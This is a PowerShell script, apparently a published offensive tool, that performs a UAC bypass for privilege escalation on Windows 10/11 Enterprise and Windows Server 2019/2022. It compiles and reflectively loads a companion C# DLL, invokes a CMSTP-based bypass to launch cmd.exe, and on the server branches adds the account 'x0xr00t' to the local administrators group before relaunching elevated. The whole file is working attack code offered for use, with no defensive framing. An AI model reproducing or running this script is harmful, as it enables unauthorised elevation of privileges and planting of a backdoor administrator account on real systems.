#!-.ps1 
#
# Author : P.Hoogeveem
# Aka    : x0xr00t
# Build  : 20210809
# Name   : UAC Bypass Win Server 2022
# Impact : Privesc 
# Method : DllReflection
# 
# Usage  : run the .ps1 file. 

write-Host ""
write-Host ""
write-Host ""
Write-Host " 000000000000000000000000000000000000000000"
Write-Host " 0 Sl0ppyR00t Gonna Check the os version. 0"
write-Host " 0   We do the UAC based on the os        0" 
Write-Host " 0     So that u dont need to check it.   0"
write-Host " 0            Team Sl0ppyRoot             0"
write-Host " 0               ~x0xr00t~                0"
Write-Host " 000000000000000000000000000000000000000000"
write-Host ""
write-Host ""

# OS-Check
$OSVersion = (get-itemproperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName).ProductName
switch ($OSVersion)
{
    "Windows 10 Enterprise"
    {
	    Write-Host " 00000000000000000000000000000000000000"
        Write-Host " 0 Sl0ppyR00t says it's a Windows 10! 0"
		Write-Host " 00000000000000000000000000000000000000"
        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"

        [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))

        [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
  
        If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
        {
        # Relaunch as an elevated process:
          Start-Process powershell.exe "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb RunAs
          exit
        }
        whoami
    }
    "Windows Server 2019"
    {
	    Write-Host " 000000000000000000000000000000000000000000000000"
        Write-Host " 0 Sl0ppyR00t says it's a Windows Server 20919! 0"
		Write-Host " 000000000000000000000000000000000000000000000000"
        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"

        [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))

        [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
        # Add User to ADMIN Group 
        net localgroup administrators x0xr00t /add
        If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
        {
        # Relaunch as an elevated process:
          Start-Process powershell.exe "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb RunAs
          exit
        }
        whoami
    }
    "Windows 11 Enterprise"
    {
	    Write-Host " 00000000000000000000000000000000000000"
        Write-Host " 0 Sl0ppyR00t says it's a Windows 11! 0"
		Write-Host " 00000000000000000000000000000000000000"
        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"

        [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))

        [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
  
        If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
        {
        # Relaunch as an elevated process:
          Start-Process powershell.exe "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb RunAs
          exit
        }
        whoami
    }
    "Microsoft Windows Server 2022"
    {
	    Write-Host " 00000000000000000000000000000000000000000000000"
        Write-Host " 0 Sl0ppyR00t says it's a Windows Server 2022! 0"
		Write-Host " 00000000000000000000000000000000000000000000000"
        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"

        [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))

        [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
        # Add User to ADMIN Group 
        net localgroup administrators x0xr00t /add
        If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
        {
        # Relaunch as an elevated process:
          Start-Process powershell.exe "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb RunAs
          exit
        }
        whoami
    }
}
